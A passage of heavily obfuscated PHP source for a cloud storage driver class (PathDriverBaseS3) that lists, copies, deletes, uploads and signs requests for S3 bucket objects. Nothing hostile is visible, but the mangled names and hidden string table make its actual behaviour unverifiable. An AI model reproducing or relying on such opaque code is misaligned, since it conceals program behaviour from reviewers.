$ÅÃ˜àÖº[12], $ÅÃ˜àÖº[32]); $â†ŞÅµ = $ÅÃ˜àÖº[10] . get_path_ext($’µ„³—¢); $â†ŞÅµ = $â†ŞÅµ == $ÅÃ˜àÖº[10] || $íò§’êÏ ? $ÅÃ˜àÖº[12] : $â†ŞÅµ; $°ê¶ı = substr($’µ„³—¢, 0, strlen($’µ„³—¢) - strlen($â†ŞÅµ)); $Îãéˆ„ = $°ê¶ı . "\50\x30\51{$â†ŞÅµ}"; for ($¿ıÌå”Ñ = 1; $¿ıÌå”Ñ <= count($æ¹ôÎà‘) + 1; $¿ıÌå”Ñ++) { $Îãéˆ„ = $°ê¶ı . "\50{$¿ıÌå”Ñ}\51{$â†ŞÅµ}"; if (!in_array_not_case($Îãéˆ„, $æ¹ôÎà‘)) { return $Îãéˆ„; } } return $Îãéˆ„; } public function listAllFiles($Ù½ã³ò, $‚®Ì¹ıç, $áíïŸÔÔ = array()) { $Ã¨å­à† =& $_SERVER[ä¿÷‹µ±]; if (empty($‚®Ì¹ıç)) { return array(); } $…£í¯“ = array(); $Ù½ã³ò = trim($Ù½ã³ò, $Ã¨å­à†[8]); foreach ($‚®Ì¹ıç as $É¬™‘™à) { $û¹èÙ•à = ltrim(substr(trim($É¬™‘™à, $Ã¨å­à†[8]), strlen($Ù½ã³ò)), $Ã¨å­à†[8]); $…£í¯“ = array_merge($…£í¯“, $this->slicePath($û¹èÙ•à)); } $ß¾€Æ†â = array(); foreach (array_unique($…£í¯“) as $É¬™‘™à) { $òõ Í÷İ = array($Ã¨å­à†[84] => $this->getPathOuter($Ã¨å­à†[8] . $Ù½ã³ò . $Ã¨å­à†[8] . $É¬™‘™à), $Ã¨å­à†[75] => 1, $Ã¨å­à†[76] => 0); if (substr($É¬™‘™à, -1) != $Ã¨å­à†[8]) { $òõ Í÷İ[$Ã¨å­à†[75]] = 0; $Ñ­òªÒÆ = $this->getPath($Ù½ã³ò . $Ã¨å­à†[8] . $É¬™‘™à); $òõ Í÷İ[$Ã¨å­à†[76]] = isset($áíïŸÔÔ[$Ñ­òªÒÆ]) ? $áíïŸÔÔ[$Ñ­òªÒÆ] : $this->size($Ñ­òªÒÆ); } $ß¾€Æ†â[] = $òõ Í÷İ; } return $ß¾€Æ†â; } public function slicePath($Ì¿¨á°Ğ) { $ÓÖØ–æ  =& $_SERVER[ä¿÷‹µ±]; $µ‘ò¨ó = explode($ÓÖØ–æ [8], trim($Ì¿¨á°Ğ, $ÓÖØ–æ [8])); $µ–º½¦÷ = 0; do { ++$µ–º½¦÷; $Á²ÑÍÃŞ[] = implode($ÓÖØ–æ [8], array_slice($µ‘ò¨ó, 0, $µ–º½¦÷)) . $ÓÖØ–æ [8]; } while ($µ–º½¦÷ < count($µ‘ò¨ó)); $Á²ÑÍÃŞ[count($µ‘ò¨ó) - 1] = $Ì¿¨á°Ğ; return $Á²ÑÍÃŞ; } public function getHost() { $¶Ñ¢‡° =& $_SERVER[ä¿÷‹µ±]; $áƒÑÕÂ¢ = parse_url(trim($this->domain, $¶Ñ¢‡°[8])); $ïÎ¾ûä’ = isset($áƒÑÕÂ¢[$¶Ñ¢‡°[180]]) ? $áƒÑÕÂ¢[$¶Ñ¢‡°[180]] : http_type(); $”§·íŸ€ = isset($áƒÑÕÂ¢[$¶Ñ¢‡°[181]]) ? $áƒÑÕÂ¢[$¶Ñ¢‡°[181]] : $áƒÑÕÂ¢[$¶Ñ¢‡°[84]]; if (isset($áƒÑÕÂ¢[$¶Ñ¢‡°[182]])) { $”§·íŸ€ .= $¶Ñ¢‡°[4] . $áƒÑÕÂ¢[$¶Ñ¢‡°[182]]; } return $ïÎ¾ûä’ . $¶Ñ¢‡°[183] . $”§·íŸ€; } public function pathEncode($£öÄáÓ¯) { $¨ù—Ó×† =& $_SERVER[ä¿÷‹µ±]; return str_replace($¨ù—Ó×†[184], $¨ù—Ó×†[8], rawurlencode($£öÄáÓ¯)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($™Ä—’‰å) { set_timeout(); require_once SDK_DIR . $_SERVER[ä¿÷‹µ±][185]; parent::__construct(); $this->_init($™Ä—’‰å); } public function _init($ß†¬ê±„) { foreach ($ß†¬ê±„ as $–†ØƒÜ => $İêÍ˜¦) { if (isset($this->{$–†ØƒÜ})) { $this->{$–†ØƒÜ} = $İêÍ˜¦; } } $this->endpoint = $ß†¬ê±„[$_SERVER[ä¿÷‹µ±][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($°ìÔïş¢ = "\166\x34") { $this->signVer = $°ìÔïş¢; $this->client->setSignatureVersion($°ìÔïş¢); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $Ôç…¿ô‰ =& $_SERVER[ä¿÷‹µ±]; $Æ€ëÔ‰ = $this->getBucketCors(); if (!$Æ€ëÔ‰ || !is_array($Æ€ëÔ‰)) { return !1; } if ($Æ€ëÔ‰[$Ôç…¿ô‰[187]] != $Ôç…¿ô‰[188] || $Æ€ëÔ‰[$Ôç…¿ô‰[189]] != $Ôç…¿ô‰[188]) { return !1; } $ØÇ¡ÄôŒ = array_map($Ôç…¿ô‰[190], $Æ€ëÔ‰[$Ôç…¿ô‰[191]]); if (!is_array($ØÇ¡ÄôŒ)) { $ØÇ¡ÄôŒ = array(); } $£­£³š = array($Ôç…¿ô‰[192], $Ôç…¿ô‰[193], $Ôç…¿ô‰[194], $Ôç…¿ô‰[195], $Ôç…¿ô‰[196]); $ã°¶é÷ = array_diff($£­£³š, $ØÇ¡ÄôŒ); return empty($ã°¶é÷); } public function mkfile($È£ş¸Ë, $ƒ·“šˆ¼ = '', $éŸ›°âŠ = REPEAT_RENAME) { $­ê™ô®š = $this->setContent($È£ş¸Ë, $ƒ·“šˆ¼); if ($­ê™ô®š !== !1) { return $this->getPathOuter($È£ş¸Ë); } return !1; } public function mkdir($ú·ïô»ü, $à©ù‘¶î = REPEAT_SKIP) { $¿ªÜâñ® =& $_SERVER[ä¿÷‹µ±]; if (empty($ú·ïô»ü) && $ú·ïô»ü !== $¿ªÜâñ®[197]) { return !1; } if ($à©ù‘¶î && $this->_isFolder($ú·ïô»ü)) { return $this->getPathOuter($ú·ïô»ü); } $§ÂóÔöî = $this->setContent($ú·ïô»ü, $¿ªÜâñ®[12], !0); if ($§ÂóÔöî !== !1) { return $this->getPathOuter($ú·ïô»ü); } return !1; } public function copyFile($Äò‹Ó, $æÀéò, $à‚Ş¬”ô = array()) { $¸ŒéÇô =& $_SERVER[ä¿÷‹µ±]; $”ûó«ÙÒ = $this->objectMeta($Äò‹Ó); if (!$”ûó«ÙÒ) { return !1; } if ($”ûó«ÙÒ[$¸ŒéÇô[76]] <= 1024 * 1024 * 200) { $®îûÜ¤á = $this->client->copyObject($this->bucket, $Äò‹Ó, $this->bucket, $æÀéò, $¸ŒéÇô[198], $à‚Ş¬”ô); } else { $®îûÜ¤á = $this->client->multiCopyObject($this->bucket, $Äò‹Ó, $this->bucket, $æÀéò, $à‚Ş¬”ô); } $®îûÜ¤á = $®îûÜ¤á ? $this->getPathOuter($æÀéò) : !1; return $®îûÜ¤á; } public function moveFile($•÷Æ­Ù, $ìÌßÒ¬ì) { if ($this->copyFile($•÷Æ­Ù, $ìÌßÒ¬ì)) { $this->delFile($•÷Æ­Ù); return $this->getPathOuter($ìÌßÒ¬ì); } return !1; } public function delFile($ƒÚ¥ˆıö) { return $this->client->deleteObject($this->bucket, $ƒÚ¥ˆıö); } public function delFolder($é¾ÎßŒÎ) { $øØ«Áˆ× =& $_SERVER[ä¿÷‹µ±]; if (!$this->exist($é¾ÎßŒÎ)) { return !0; } $this->listItemCache = !1; $§•ì¡ğ = $this->fileList($é¾ÎßŒÎ); $this->listItemCache = !0; $å®‰óÀñ = trim($é¾ÎßŒÎ, $øØ«Áˆ×[8]) . $øØ«Áˆ×[8]; if (!empty($é¾ÎßŒÎ) && $é¾ÎßŒÎ !== $øØ«Áˆ×[197] && !in_array($å®‰óÀñ, $§•ì¡ğ[$øØ«Áˆ×[82]])) { $§•ì¡ğ[$øØ«Áˆ×[82]][] = $å®‰óÀñ; } $ğÃÜá† = $this->delByBatch($§•ì¡ğ[$øØ«Áˆ×[83]]); if (!$ğÃÜá†) { return !1; } $ğÃÜá† = $this->delByBatch($§•ì¡ğ[$øØ«Áˆ×[82]]); if (!$ğÃÜá†) { return !1; } return $this->delFile($å®‰óÀñ); } private function delByBatch($Õ”å¨ÇĞ) { foreach (array_chunk($Õ”å¨ÇĞ, 1000) as $êæí°¹) { $ïŞ¢ú· = $this->client->deleteObjects($this->bucket, $êæí°¹); if (!$ïŞ¢ú·) { return !1; } } return !0; } public function rename($šíÉÊ‹Å, $†Ñä³éÇ) { return $this->renameObject($šíÉÊ‹Å, $†Ñä³éÇ); } public function listPath($—¬¿üŞë, $«Û„¨¸¾ = false) { $¨‰–Ğœ˜ =& $_SERVER[ä¿÷‹µ±]; $İ«ıÎçì = $this->fileList($—¬¿üŞë, $¨‰–Ğœ˜[8], !0); foreach ($İ«ıÎçì[$¨‰–Ğœ˜[82]] as $ñç†Å² => $ÙÊ¸ê‚¾) { $İ«ıÎçì[$¨‰–Ğœ˜[82]][$ñç†Å²] = $this->folderInfo($ÙÊ¸ê‚¾, $«Û„¨¸¾, $ÙÊ¸ê‚¾); } foreach ($İ«ıÎçì[$¨‰–Ğœ˜[83]] as $ñç†Å² => $ÙÊ¸ê‚¾) { $İ«ıÎçì[$¨‰–Ğœ˜[83]][$ñç†Å²] = $this->fileInfo($ÙÊ¸ê‚¾[$¨‰–Ğœ˜[32]], $«Û„¨¸¾, $ÙÊ¸ê‚¾); } return $İ«ıÎçì; } protected function infoChildren($›” ”·, &$«‡¬ãÖ) { $¶œ¶øéÜ =& $_SERVER[ä¿÷‹µ±]; $ŠëŒˆ€‰ = $this->fileList($›” ”·, $¶œ¶øéÜ[12], !0); $«‡¬ãÖ[$¶œ¶øéÜ[78]] += count($ŠëŒˆ€‰[$¶œ¶øéÜ[82]]); $«‡¬ãÖ[$¶œ¶øéÜ[77]] += count($ŠëŒˆ€‰[$¶œ¶øéÜ[83]]); foreach ($ŠëŒˆ€‰[$¶œ¶øéÜ[83]] as $ş‘‹¿İŸ) { if (!$ş‘‹¿İŸ || !$ş‘‹¿İŸ[$¶œ¶øéÜ[76]]) { continue; } $«‡¬ãÖ[$¶œ¶øéÜ[76]] += $ş‘‹¿İŸ[$¶œ¶øéÜ[76]]; } } private function fileInfo($ÂŸ¨Ñç˜, $Ï›´ö = false, $¢ÙİŠÜ = array()) { $“ôù…úÒ =& $_SERVER[ä¿÷‹µ±]; $é•Ì•è = array($“ôù…úÒ[32] => $this->pathThis($ÂŸ¨Ñç˜), $“ôù…úÒ[84] => $this->getPathOuter($ÂŸ¨Ñç˜), $“ôù…úÒ[33] => $“ôù…úÒ[199], $“ôù…úÒ[174] => $this->ext($ÂŸ¨Ñç˜), $“ôù…úÒ[76] => isset($¢ÙİŠÜ[$“ôù…úÒ[76]]) ? $¢ÙİŠÜ[$“ôù…úÒ[76]] : 0); if ($Ï›´ö) { return $é•Ì•è; } $é•Ì•è[$“ôù…úÒ[200]] = $é•Ì•è[$“ôù…úÒ[85]] = 0; $é•Ì•è[$“ôù…úÒ[201]] = $é•Ì•è[$“ôù…úÒ[202]] = !0; if (empty($¢ÙİŠÜ)) { $¢ÙİŠÜ = $this->objectMeta($ÂŸ¨Ñç˜); if (!$¢ÙİŠÜ) { return $é•Ì•è; } } if (isset($¢ÙİŠÜ[$“ôù…úÒ[203]])) { $é•Ì•è[$“ôù…úÒ[85]] = $¢ÙİŠÜ[$“ôù…úÒ[203]]; } if (isset($¢ÙİŠÜ[$“ôù…úÒ[76]])) { $é•Ì•è[$“ôù…úÒ[76]] = $¢ÙİŠÜ[$“ôù…úÒ[76]]; } return $é•Ì•è; } private function folderInfo($“Š™íÜ«, $‰ìÏ÷ïÍ = false, $…æ×ĞÁğ = array()) { $“ğ§øÍæ =& $_SERVER[ä¿÷‹µ±]; $Å¿öñ˜Ù = array($“ğ§øÍæ[32] => $this->pathThis($“Š™íÜ«), $“ğ§øÍæ[84] => $this->getPathOuter($“ğ§øÍæ[8] . $“Š™íÜ«), $“ğ§øÍæ[33] => $“ğ§øÍæ[75]); if ($‰ìÏ÷ïÍ) { return $Å¿öñ˜Ù; } $Å¿öñ˜Ù[$“ğ§øÍæ[200]] = $Å¿öñ˜Ù[$“ğ§øÍæ[85]] = 0; $Å¿öñ˜Ù[$“ğ§øÍæ[201]] = $Å¿öñ˜Ù[$“ğ§øÍæ[202]] = !0; if ($“Š™íÜ« == $“ğ§øÍæ[12]) { return $Å¿öñ˜Ù; } if (empty($…æ×ĞÁğ)) { $…æ×ĞÁğ = $this->objectMeta(trim($“Š™íÜ«, $“ğ§øÍæ[8]) . $“ğ§øÍæ[8]); } if (isset($…æ×ĞÁğ[$“ğ§øÍæ[203]])) { $Å¿öñ˜Ù[$“ğ§øÍæ[200]] = $…æ×ĞÁğ[$“ğ§øÍæ[203]]; } return $Å¿öñ˜Ù; } private function fileList($Ú‰ì‚ˆ», $‡‡ˆ¤èÉ = '', $Şñ…Ããº = 0) { $İ†üŞ¬õ =& $_SERVER[ä¿÷‹µ±]; $ã¹Ç´° = rtrim($Ú‰ì‚ˆ», $İ†üŞ¬õ[8]) . $İ†üŞ¬õ[8]; $ˆ¡ğÓÕì = $this->listObjs($ã¹Ç´°, null, null, $‡‡ˆ¤èÉ); if (!$ˆ¡ğÓÕì) { return array($İ†üŞ¬õ[82] => array(), $İ†üŞ¬õ[83] => array()); } $ˆñä¦ä÷ = $¦ÉÏÀ–Ç = array(); foreach ($ˆ¡ğÓÕì[$İ†üŞ¬õ[204]] as $’’ÈŠŞ…) { $ñ¬¶¤ÆÁ = $’’ÈŠŞ…[$İ†üŞ¬õ[32]]; if ($ñ¬¶¤ÆÁ == $ã¹Ç´°) { continue; } $Ó‚ŒüÛ” = isset($’’ÈŠŞ…[$İ†üŞ¬õ[76]]) ? $’’ÈŠŞ…[$İ†üŞ¬õ[76]] : 0; $¥Ú¹ÖŠ£ = $Ó‚ŒüÛ” == 0 && substr($ñ¬¶¤ÆÁ, strlen($ñ¬¶¤ÆÁ) - 1, 1) == $İ†üŞ¬õ[8] ? !0 : !1; $this->cacheMethodInfoSet($ñ¬¶¤ÆÁ, $¥Ú¹ÖŠ£, $’’ÈŠŞ…); if ($¥Ú¹ÖŠ£) { $ˆñä¦ä÷[] = $ñ¬¶¤ÆÁ; continue; } $¦ÉÏÀ–Ç[] = $Şñ…Ããº ? $’’ÈŠŞ… : $ñ¬¶¤ÆÁ; } foreach ($ˆ¡ğÓÕì[$İ†üŞ¬õ[205]] as $’’ÈŠŞ…) { $ˆñä¦ä÷[] = $’’ÈŠŞ…[$İ†üŞ¬õ[32]]; $this->cacheMethodInfoSet($’’ÈŠŞ…[$İ†üŞ¬õ[32]], !0); } $this->cacheMethodInfoSet($Ú‰ì‚ˆ», !0); return array($İ†üŞ¬õ[82] => $ˆñä¦ä÷, $İ†üŞ¬õ[83] => $¦ÉÏÀ–Ç); } private function listObjs($ÚŸ…•›, $·¡õÃ½ = null, $¸‚àœ‰Ş = null, $â¯¢„ñƒ = null) { $†Òúé× =& $_SERVER[ä¿÷‹µ±]; $ÚŸ…•› = trim($ÚŸ…•›, $†Òúé×[8]); $Ö‘¬£üà = empty($ÚŸ…•›) && $ÚŸ…•› !== $†Òúé×[197] ? $†Òúé×[12] : $ÚŸ…•› . $†Òúé×[8]; return $this->client->getBucket($this->bucket, $Ö‘¬£üà, $·¡õÃ½, $¸‚àœ‰Ş, $â¯¢„ñƒ, !0); } public function has($öïñ¹Å·, $üÂû³ÍÔ = false, $ıÌë¶™§ = true) { $Ñ±²Ü™É =& $_SERVER[ä¿÷‹µ±]; $öïñ¹Å· = trim($öïñ¹Å·, $Ñ±²Ü™É[8]); $ôıûèÂ = empty($öïñ¹Å·) && $öïñ¹Å· !== $Ñ±²Ü™É[197] ? $Ñ±²Ü™É[12] : $öïñ¹Å· . $Ñ±²Ü™É[8]; $ƒÔå„¨‡ = null; $‚ñ‘‹ê = 500; $„§È›•¤ = $Ñ±²Ü™É[8]; $ÁÊŞÑÈÇ = $ü‰«µ” = array(); while (!0) { $£–½ñÍ„ = $this->listObjs($öïñ¹Å·, $ƒÔå„¨‡, $‚ñ‘‹ê, $„§È›•¤); if (!$£–½ñÍ„) { break; } $ƒÔå„¨‡ = $£–½ñÍ„[$Ñ±²Ü™É[206]]; $ûı«ôİ× = $£–½ñÍ„[$Ñ±²Ü™É[204]]; $ÆÄéµ… = $£–½ñÍ„[$Ñ±²Ü™É[205]]; if (empty($ûı«ôİ×) && empty($ÆÄéµ…)) { break; } if (count($ûı«ôİ×) == 1 && $ûı«ôİ×[0][$Ñ±²Ü™É[32]] == $ôıûèÂ) { break; } if ($üÂû³ÍÔ) { if (count($ûı«ôİ×)) { $ûı«ôİ× = array_column($ûı«ôİ×, $Ñ±²Ü™É[32]); $ÁÊŞÑÈÇ = array_merge($ÁÊŞÑÈÇ, $ûı«ôİ×); } if (count($ÆÄéµ…)) { $ÆÄéµ… = array_column($ÆÄéµ…, $Ñ±²Ü™É[32]); $ü‰«µ” = array_merge($ü‰«µ”, $ÆÄéµ…); } if ($ƒÔå„¨‡ === null) { break; } continue; } if ($ıÌë¶™§) { if (!empty($ûı«ôİ×)) { if (count($ûı«ôİ×) > 1 || isset($ûı«ôİ×[0][$Ñ±²Ü™É[32]]) && $ûı«ôİ×[0][$Ñ±²Ü™É[32]] != $ôıûèÂ) { return !0; } } } else { if (!empty($ÆÄéµ…)) { return !0; } } if ($ƒÔå„¨‡ === null) { break; } } if ($üÂû³ÍÔ) { $ÁÊŞÑÈÇ = array_diff($ÁÊŞÑÈÇ, array($ôıûèÂ)); $ÁÊŞÑÈÇ = count(array_unique($ÁÊŞÑÈÇ)); $ü‰«µ” = count(array_unique($ü‰«µ”)); return array($Ñ±²Ü™É[207] => $ÁÊŞÑÈÇ, $Ñ±²Ü™É[208] => $ü‰«µ”); } return !1; } public function listAll($ä·áÂµ§) { $òé†É« =& $_SERVER[ä¿÷‹µ±]; $˜ùÖ¼Ç‘ = $this->fileList($ä·áÂµ§, $òé†É«[12], !0); $ö¢¸˜è = array(); foreach ($˜ùÖ¼Ç‘[$òé†É«[83]] as $·´Úê») { $ö¢¸˜è[$·´Úê»[$òé†É«[32]]] = $·´Úê»[$òé†É«[76]]; } foreach ($˜ùÖ¼Ç‘[$òé†É«[82]] as $·´Úê») { if (is_string($·´Úê»)) { $ö¢¸˜è[$·´Úê»] = 0; } } return $this->listAllFiles($ä·áÂµ§, array_keys($ö¢¸˜è), $ö¢¸˜è); } public function canRead($ÅŒ–ı¹) { $—¼‹ÕÉ¯ =& $_SERVER[ä¿÷‹µ±]; $€Ú÷ğ = $this->client->getAccessControlPolicy($this->bucket, $ÅŒ–ı¹); if (!$€Ú÷ğ) { return !1; } return in_array($€Ú÷ğ, array($—¼‹ÕÉ¯[209], $—¼‹ÕÉ¯[210], $—¼‹ÕÉ¯[211])) ? !0 : !1; } public function canWrite($ı½Ö€í¡) { $ı†½½œ† =& $_SERVER[ä¿÷‹µ±]; $ÊÊëŞğØ = $this->client->getAccessControlPolicy($this->bucket, $ı½Ö€í¡); if (!$ÊÊëŞğØ) { return !1; } return in_array($ÊÊëŞğØ, array($ı†½½œ†[209], $ı†½½œ†[210])) ? !0 : !1; } public function getContent($ÙºÒ°) { return $this->client->getObject($this->bucket, $ÙºÒ°); } public function setContent($ˆ¡×ˆËß, $¤‹˜’šç = '', $×øŞ´Ë = false) { $ÆÔâ¿îâ =& $_SERVER[ä¿÷‹µ±]; $ˆ¡×ˆËß = $×øŞ´Ë ? trim($ˆ¡×ˆËß, $ÆÔâ¿îâ[8]) . $ÆÔâ¿îâ[8] : $ˆ¡×ˆËß; $Œ¾ÖÜ® = get_file_mime(get_path_ext($ˆ¡×ˆËß)); $½©Ò’Øş = $this->client->putObject($¤‹˜’šç, $this->bucket, $ˆ¡×ˆËß, $ÆÔâ¿îâ[198], array(), $Œ¾ÖÜ®); if (!$½©Ò’Øş) { return !1; } if ($×øŞ´Ë) { return !0; } $this->cacheMethod(null, null); $½©Ò’Øş = $this->copyFile($ˆ¡×ˆËß, $ˆ¡×ˆËß, array($ÆÔâ¿îâ[212] => $½©Ò’Øş[$ÆÔâ¿îâ[213]])); return $½©Ò’Øş ? !0 : !1; } public function fileSubstr($Ë«€äÚ÷, $´ößß›, $óÂõ¿Á¦) { $Ó¡®†‰‚ = $´ößß› + $óÂõ¿Á¦ - 1; return $this->client->getObject($this->bucket, $Ë«€äÚ÷, array($_SERVER[ä¿÷‹µ±][214] => "\x62\x79\x74\x65\x73\75{$´ößß›}\x2d{$Ó¡®†‰‚}")); } public function upload($ÌƒŠâ¢Ñ, $ÕÜğó¥ó, $¹ÚÎÜ¤® = false, $Ï²£‘æÀ = REPEAT_REPLACE) { $µ÷ãî =& $_SERVER[ä¿÷‹µ±]; $î±£“å¬ = array($µ÷ãî[212] => @md5_file($ÕÜğó¥ó)); $õàééŸ© = array($µ÷ãî[215] => get_file_mime(get_path_ext($ÌƒŠâ¢Ñ))); if (IO::size($ÕÜğó¥ó) <= 1024 * 1024 * 200) { $øÛå„’† = $this->client->putObjectFile($ÕÜğó¥ó, $this->bucket, $ÌƒŠâ¢Ñ, $µ÷ãî[198], $î±£“å¬, $õàééŸ©); return !empty($øÛå„’†) ? $this->getPathOuter($ÌƒŠâ¢Ñ) : !1; } $‡÷ÈˆÄ× = $this->client->multiUploadObject($ÕÜğó¥ó, $this->bucket, trim($ÌƒŠâ¢Ñ, $µ÷ãî[8]), $î±£“å¬, $õàééŸ©); return $‡÷ÈˆÄ× ? $this->getPathOuter($ÌƒŠâ¢Ñ) : !1; } public function download($§‹ùªú¿, $ææ¸¾ùó) { if (!@is_dir($this->pathFather($ææ¸¾ùó)) && !IO::mkdir($this->pathFather($ææ¸¾ùó))) { return !1; } $ÌÒ›…¬ = $this->client->getObject($this->bucket, $§‹ùªú¿, array(), $ææ¸¾ùó); return $ÌÒ›…¬ !== !1 ? $ææ¸¾ùó : !1; } public function link($·¡ù‰­Â, $ÜàÖ¶ËÛ = array()) { $³ù‘’¥Ö =& $_SERVER[ä¿÷‹µ±]; if ($this->signVer == $³ù‘’¥Ö[216]) { return $this->client->getAuthenticatedURL($this->bucket, $·¡ù‰­Â, 3600 * 12, $ÜàÖ¶ËÛ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($·¡ù‰­Â, $³ù‘’¥Ö[8]), 3600 * 12, $this->region, array(), !0, $ÜàÖ¶ËÛ); } public function fileOut($ªÁùÃ€•, $±‘º˜¥š = false, $Ì›À‡¿ = false, $ë«è¶³Â = '') { $ŒŠı¯÷ş =& $_SERVER[ä¿÷‹µ±]; if ($this->isFileOutServer()) { return $this->fileOutServer($ªÁùÃ€•, $±‘º˜¥š, $Ì›À‡¿, $ë«è¶³Â); } if (!$Ì›À‡¿) { $Ì›À‡¿ = $this->pathThis($ªÁùÃ€•); } $ÒÆúÂôæ = get_file_mime(get_path_ext($Ì›À‡¿)); if ($ÒÆúÂôæ == $ŒŠı¯÷ş[217]) { return parent::fileOut($ªÁùÃ€•, $±‘º˜¥š, $Ì›À‡¿, $ë«è¶³Â); } $²²†ñ†Ê = array($ŒŠı¯÷ş[218] => $ÒÆúÂôæ); if ($±‘º˜¥š) { $²²†ñ†Ê[$ŒŠı¯÷ş[219]] = $ŒŠı¯÷ş[220] . rawurlencode($Ì›À‡¿); } else { } $¹åÄ  ¬ = $this->link($ªÁùÃ€•, $²²†ñ†Ê); $this->fileOutLink($¹åÄ  ¬); } public function fileOutServer($Š„–œ§¡, $•ˆÊÓ²¶ = false, $ã–ÛşÀØ = false, $¬Œ¼ƒÍã = '') { parent::fileOut($Š„–œ§¡, $•ˆÊÓ²¶, $ã–ÛşÀØ, $¬Œ¼ƒÍã); } public function fileOutImageServer($ôÅÓµí, $æ©û×Ç˜ = 250) { parent::fileOutImage($ôÅÓµí, $æ©û×Ç˜); } public function hashMd5($Ö™úä—, $„÷ì¥äƒ = '') { $±õëúßİ =& $_SERVER[ä¿÷‹µ±]; $ˆ‚ç£§• = $this->objectMeta($Ö™úä—); if (!$ˆ‚ç£§•) { return !1; } $„÷ì¥äƒ = $„÷ì¥äƒ ? $„÷ì¥äƒ : _get($ˆ‚ç£§•, $±õëúßİ[221]); $„÷ì¥äƒ = $„÷ì¥äƒ ? $„÷ì¥äƒ : _get($ˆ‚ç£§•, $±õëúßİ[213], $±õëúßİ[12]); return $„÷ì¥äƒ; } public function uploadFormData($Äëïè­„, $‚šÖŸ = 3600) { $á€ïÀö =& $_SERVER[ä¿÷‹µ±]; $©¨‰ ¦à = $this->pathFather($Äëïè­„); $­íˆôÔ‰ = $this->client->getHttpUploadPostParams($this->bucket, $©¨‰ ¦à, $á€ïÀö[198], $‚šÖŸ); return array_merge((array) $­íˆôÔ‰, array($á€ïÀö[181] => $this->getHost())); } public function multiUploadFormData($ûËœ‰Ä¬, $À‰úÚÚŞ = 3600) { $âè² µ­ =& $_SERVER[ä¿÷‹µ±]; $Ÿ˜¯¤Ö = gmdate($âè² µ­[222]); $©¦–ø®â = array(); $÷Êş‚ü† = $this->client->getUploadId($this->bucket, $ûËœ‰Ä¬, $©¦–ø®â); if (!$÷Êş‚ü†) { return !1; } return array($âè² µ­[223] => $÷Êş‚ü†, $âè² µ­[181] => $this->getHost() . $âè² µ­[8] . $this->pathEncode($ûËœ‰Ä¬), $âè² µ­[224] => $Ÿ˜¯¤Ö, $âè² µ­[94] => $ûËœ‰Ä¬); } public function multiUploadAuthData($ÁàçÙÃÙ, $¦¾ë²€‹ = array()) { $ç¡µÍ«â =& $_SERVER[ä¿÷‹µ±]; $–ÃÄË¥é = isset($¦¾ë²€‹[$ç¡µÍ«â[224]]) ? $¦¾ë²€‹[$ç¡µÍ«â[224]] : gmdate($ç¡µÍ«â[222]); $¡ëšƒ¬• = isset($¦¾ë²€‹[$ç¡µÍ«â[174]]) ? $¦¾ë²€‹[$ç¡µÍ«â[174]] : $ç¡µÍ«â[12]; $Ü–µúœ = $¦¾ë²€‹[$ç¡µÍ«â[94]]; unset($¦¾ë²€‹[$ç¡µÍ«â[94]]); if (isset($¦¾ë²€‹[$ç¡µÍ«â[225]])) { $¦¾ë²€‹[$ç¡µÍ«â[224]] = $–ÃÄË¥é; return $this->listUploadParts($Ü–µúœ, $¦¾ë²€‹); } $úûü‡å´ = array($ç¡µÍ«â[226], $ç¡µÍ«â[12], $ç¡µÍ«â[120], $ç¡µÍ«â[12], "\x78\55\141\x6d\172\55\x64\141\x74\145\x3a{$–ÃÄË¥é}", $ç¡µÍ«â[8] . $this->bucket . $ç¡µÍ«â[8] . $this->pathEncode($Ü–µúœ) . $¡ëšƒ¬•); if (strpos($¡ëšƒ¬•, $ç¡µÍ«â[227]) === 0) { $úûü‡å´[0] = $ç¡µÍ«â[228]; } if (isset($¦¾ë²€‹[$ç¡µÍ«â[229]]) && $¦¾ë²€‹[$ç¡µÍ«â[229]] == $ç¡µÍ«â[230]) { $úûü‡å´[0] = $ç¡µÍ«â[230]; } $¾÷Ô­Ç  = implode($ç¡µÍ«â[231], $úûü‡å´); $™í¦¥’Ç = base64_encode(hash_hmac($ç¡µÍ«â[232], $¾÷Ô­Ç , $this->secret, !0)); $íÎ˜ºò = $ç¡µÍ«â[233] . $this->accessKey . $ç¡µÍ«â[4] . $™í¦¥’Ç; if (strpos($¡ëšƒ¬•, $ç¡µÍ«â[227]) === 0) { return array($ç¡µÍ«â[234] => $íÎ˜ºò, $ç¡µÍ«â[224] => $–ÃÄË¥é); } return $íÎ˜ºò; } public function listUploadParts($­»æ”µÚ, $Â˜Œş“› = array()) { $ËĞóº·º =& $_SERVER[ä¿÷‹µ±]; $ÆÅ‹ôã˜ = str_replace($ËĞóº·º[235], $ËĞóº·º[12], $Â˜Œş“›[$ËĞóº·º[174]]); $çùîáùÛ = $this->client->listParts($this->bucket, $­»æ”µÚ, $ÆÅ‹ôã˜); if (!$çùîáùÛ) { return !1; } unset($Â˜Œş“›[$ËĞóº·º[225]], $Â˜Œş“›[$ËĞóº·º[229]]); $Â˜Œş“›[$ËĞóº·º[94]] = $­»æ”µÚ; $ºïÉÙ†ä = $this->multiUploadAuthData($­»æ”µÚ, $Â˜Œş“›); if (empty($ºïÉÙ†ä)) { return !1; } return array($ËĞóº·º[234] => $ºïÉÙ†ä, $ËĞóº·º[224] => $Â˜Œş“›[$ËĞóº·º[224]], $ËĞóº·º[236] => $çùîáùÛ); } public function getHost() { return parent::getHost() . $_SERVER[ä¿÷‹µ±][8] . $this->bucket; } public function size($¥ÑĞçÕ½) { $…è»öµ¢ = $this->objectMeta($¥ÑĞçÕ½); return $…è»öµ¢ ? $…è»öµ¢[$_SERVER[ä¿÷‹µ±][76]] : 0; } public function info($×Ÿ¼³ç) { if ($this->isFolder($×Ÿ¼³ç)) { return $this->folderInfo($×Ÿ¼³ç); } else { if ($this->isFile($×Ÿ¼³ç)) { return $this->fileInfo($×Ÿ¼³ç); } } return !1; } public function exist($Œ·¶ÜüÌ) { return $this->isFile($Œ·¶ÜüÌ) || 